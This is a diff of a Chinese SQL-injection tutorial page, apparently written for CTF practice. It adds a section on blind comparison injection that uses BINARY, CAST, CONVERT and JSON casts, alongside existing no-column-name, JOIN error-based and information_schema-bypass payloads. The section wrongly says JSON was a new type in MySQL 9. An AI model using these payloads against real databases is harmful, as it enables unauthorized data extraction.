@@ -688,8 +688,14 @@
     UNION注入
   </a>
   
-    <nav class="md-nav">
-      <ul class="md-nav__list">
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    比较注入
+  </a>
+  
+</li>
         
           <li class="md-nav__item">
   <a href="#join" class="md-nav__link">
@@ -702,14 +708,9 @@
     </nav>
   
 </li>
-        
-      </ul>
-    </nav>
-  
-</li>
       
         <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
+  <a href="#_3" class="md-nav__link">
     获取表名
   </a>
   
@@ -743,7 +744,7 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#_3" class="md-nav__link">
+  <a href="#_4" class="md-nav__link">
     参考链接
   </a>
   
@@ -1113,8 +1114,14 @@
     UNION注入
   </a>
   
-    <nav class="md-nav">
-      <ul class="md-nav__list">
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    比较注入
+  </a>
+  
+</li>
         
           <li class="md-nav__item">
   <a href="#join" class="md-nav__link">
@@ -1127,14 +1134,9 @@
     </nav>
   
 </li>
-        
-      </ul>
-    </nav>
-  
-</li>
       
         <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
+  <a href="#_3" class="md-nav__link">
     获取表名
   </a>
   
@@ -1168,7 +1170,7 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#_3" class="md-nav__link">
+  <a href="#_4" class="md-nav__link">
     参考链接
   </a>
   
@@ -1248,8 +1250,8 @@
 <span class="o">+</span><span class="c1">------+</span>
 <span class="mi">4</span> <span class="k">rows</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
 </code></pre></div></p>
-<p>这一句话的意思是将select 1,2,3 union select * from newtable的内容取名为**表a**，然后再按照列名进行选择 (select `1` from a)
-这里还有一个点是为什么要用 <strong>`1`</strong> 而不是 <strong>1</strong>。因为此时的表a的列名为数字1，2，3，所以需要用**反引号**对其进行转义</p>
+<p>这一句话的意思是将select 1,2,3 union select * from newtable的内容取名为 <strong>表a</strong>，然后再按照列名进行选择 (select `1` from a)
+这里还有一个点是为什么要用 <strong>`1`</strong> 而不是 <strong>1</strong>。因为此时的表a的列名为数字1，2，3，所以需要用 <strong>反引号</strong> 对其进行转义</p>
 <p>那么当有了前面的基础后，我们就可以进行无列名的注入了</p>
 <p>假设现在有一个vulnerable sql
 <div class="highlight"><pre><span></span><code><span class="k">select</span> <span class="n">id</span><span class="p">,</span><span class="n">name</span><span class="p">,</span><span class="n">pwd</span> <span class="k">from</span> <span class="n">newtable</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">&#39;{$id}&#39;</span><span class="p">;</span> 
@@ -1272,7 +1274,68 @@ payload:
 </code></pre></div></p>
 <p>总体来说，使用的还是union注入的思路，只是这里将其中的一个列换成我们要填入的payload即可</p>
 <p>注意这里需要用group_concat将`2`包裹，因为这一个无列名的payload会返回多行数据，而我们这里只能返回一个数据，所以可以使用group_concat将多行数据都连接起来，那么最后返回的也就是被我命名为2的列的数据了</p>
-<h4 id="join">JOIN报错注入</h4>
+<h3 id="_2">比较注入</h3>
+<p>在mysql中两个select查询的比较，是 <strong>按位</strong> 比较的，即先比第一位，如果相等则比第二位，以此类推</p>
+<p>在某一位上，如果前者的ASCII大，不管总长度如何，ASCII大的则大，这和c语言的strcmp()函数原理一样，举几个例子：</p>
+<ul>
+<li>a &lt; flag{xxx}</li>
+<li>fla &lt; flag{xxx}</li>
+<li>g &gt; flag{xxx}</li>
+<li>flah &gt; flag{xxx}</li>
+</ul>
+<p>在这样的按位比较过程中，因为在里层的for()循环，字典顺序是从ASCII码小到大来枚举并比较的，假设正确值为b，那么字典跑到b的时候b=b不满足payload的大于号，只能继续下一轮循环，c&gt;b此时满足了，题目返回真，这个时候就需要记录flag的值了，但是此时这一位的char是c，而真正的flag的这一位应该是b才对，所以flag += chr(char-1)，这就是为什么在还原数据的时候要往前偏移一位的原因</p>
+<p>下面来看几个具体的比较</p>
+<p>表flag的数据
+<div class="highlight"><pre><span></span><code><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">flag</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">----+-----------+</span>
+<span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">flag</span>      <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+-----------+</span>
+<span class="o">|</span>  <span class="mi">1</span> <span class="o">|</span> <span class="n">flag</span><span class="err">{</span><span class="n">xxx</span><span class="err">}</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+-----------+</span>
+<span class="mi">1</span> <span class="k">row</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
+</code></pre></div>
+这里使用 <strong>*</strong> 代替列名进行注入
+<div class="highlight"><pre><span></span><code><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="p">((</span><span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">flag</span> <span class="k">limit</span> <span class="mi">1</span><span class="p">));</span>
+<span class="o">+</span><span class="c1">-------------------------------------------------+</span>
+<span class="o">|</span> <span class="p">((</span><span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">flag</span> <span class="k">limit</span> <span class="mi">1</span><span class="p">))</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">-------------------------------------------------+</span>
+<span class="o">|</span>                                               <span class="mi">0</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">-------------------------------------------------+</span>
+<span class="mi">1</span> <span class="k">row</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
+</code></pre></div>
+因为ascii(a)是小于ascii(f)的，所以返回0</p>
+<p><div class="highlight"><pre><span></span><code><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="p">((</span><span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="s1">&#39;G&#39;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">flag</span> <span class="k">limit</span> <span class="mi">1</span><span class="p">));</span>
+<span class="o">+</span><span class="c1">-------------------------------------------------+</span>
+<span class="o">|</span> <span class="p">((</span><span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="s1">&#39;G&#39;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">flag</span> <span class="k">limit</span> <span class="mi">1</span><span class="p">))</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">-------------------------------------------------+</span>
+<span class="o">|</span>                                               <span class="mi">1</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">-------------------------------------------------+</span>
+<span class="mi">1</span> <span class="k">row</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
+</code></pre></div>
+但是在这个情况下，明明ascii(G)是小于ascii(f)，为什么会返回1呢</p>
+<p>这是因为 <strong>mysql默认是不区分大小写的</strong> ，所以说实际上比较的是ascii(g)与ascii(f)，当然前者大，返回1</p>
+<p>如果我们要比较ascii码的大小，那我们就需要使用**二进制字符串**进行比较</p>
+<p>具体来说，mysql可以使用三类函数进行类型的转换
+| Name | Description |
+| ------ | ------ |
+| BINARY | Cast a string to a binary string |
+| CAST() | Cast a value as a certain type |
+| CONVERT() | Cast a value as a certain type |</p>
+<p>所以我们只需要使用函数，进行转换类型即可实现比较 </p>
+<p>payload:
+<div class="highlight"><pre><span></span><code><span class="o">##</span> <span class="err">使用</span><span class="nb">binary</span>
+<span class="k">select</span> <span class="p">((</span><span class="k">select</span> <span class="mi">1</span><span class="p">,(</span><span class="nb">binary</span> <span class="s1">&#39;G&#39;</span><span class="p">))</span> <span class="o">&gt;</span> <span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">flag</span> <span class="k">limit</span> <span class="mi">1</span><span class="p">));</span>
+<span class="o">##</span> <span class="err">使用</span><span class="k">cast</span>
+<span class="k">select</span> <span class="p">((</span><span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="k">cast</span><span class="p">(</span><span class="s1">&#39;G&#39;</span> <span class="k">as</span> <span class="nb">binary</span><span class="p">))</span> <span class="o">&gt;</span> <span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">flag</span> <span class="k">limit</span> <span class="mi">1</span><span class="p">));</span>
+<span class="o">##</span> <span class="err">使用</span><span class="k">convert</span>
+<span class="k">select</span> <span class="p">((</span><span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="k">convert</span><span class="p">(</span><span class="s1">&#39;G&#39;</span><span class="p">,</span> <span class="nb">binary</span><span class="p">))</span> <span class="o">&gt;</span> <span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">flag</span> <span class="k">limit</span> <span class="mi">1</span><span class="p">));</span>
+</code></pre></div></p>
+<p>或者可以使用mysql9中新增的数据类型json，因为json的string类型是大小写敏感的</p>
+<p><img alt="" src="../img/NoColumnInjection%26BypassInformation_schema/1.png" /></p>
+<p>payload:
+<div class="highlight"><pre><span></span><code><span class="k">select</span> <span class="p">((</span><span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="s1">&#39;G&#39;</span><span class="p">,</span> <span class="k">cast</span><span class="p">(</span><span class="s1">&#39;0&#39;</span> <span class="k">as</span> <span class="n">json</span><span class="p">)))</span> <span class="o">&gt;</span> <span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">flag</span> <span class="k">limit</span> <span class="mi">1</span><span class="p">));</span>
+</code></pre></div></p>
+<h3 id="join">JOIN报错注入</h3>
 <p>在某些开发者配置不当的场景下，服务器会返回sql查询的错误信息
 这时我们就可以使用JOIN进行报错注入</p>
 <p>表2的数据
@@ -1317,7 +1380,7 @@ payload:
 <div class="highlight"><pre><span></span><code><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">newtable</span> <span class="n">a</span> <span class="k">join</span> <span class="n">newtable</span> <span class="n">b</span> <span class="k">using</span><span class="p">(</span><span class="n">id</span><span class="p">))</span><span class="k">c</span><span class="p">;</span>
 <span class="n">ERROR</span> <span class="mi">1060</span> <span class="p">(</span><span class="mi">42</span><span class="n">S21</span><span class="p">):</span> <span class="n">Duplicate</span> <span class="k">column</span> <span class="n">name</span> <span class="s1">&#39;name&#39;</span>
 </code></pre></div></p>
-<h2 id="_2">获取表名</h2>
+<h2 id="_3">获取表名</h2>
 <p>在有些情况下，因为过滤了or字段而导致information_schema这个库不能使用，这种情况下，我们如何查表名呢？</p>
 <p>下面的payload参考了<a href="https://www.cnblogs.com/20175211lyz/p/12358725.html">MustaphaMond</a>师傅</p>
 <h3 id="innodb">Innodb</h3>
@@ -1368,13 +1431,16 @@ payload:
 <p>包含表文件路径的表
 <div class="highlight"><pre><span></span><code><span class="k">SELECT</span> <span class="n">file_name</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">performance_schema</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">file_instances</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">file_name</span> <span class="n">REGEXP</span> <span class="k">DATABASE</span><span class="p">();</span>
 </code></pre></div></p>
-<h2 id="_3">参考链接</h2>
+<h2 id="_4">参考链接</h2>
 <ul>
 <li>
 <p><a href="https://www.cnblogs.com/GH-D/p/11962522.html">https://www.cnblogs.com/GH-D/p/11962522.html</a></p>
 </li>
 <li>
 <p><a href="https://www.cnblogs.com/20175211lyz/p/12358725.html">https://www.cnblogs.com/20175211lyz/p/12358725.html</a></p>
+</li>
+<li>
+<p><a href="https://dev.mysql.com/doc/refman/8.0/en/json.html">https://dev.mysql.com/doc/refman/8.0/en/json.html</a></p>
 </li>
 </ul>
                 
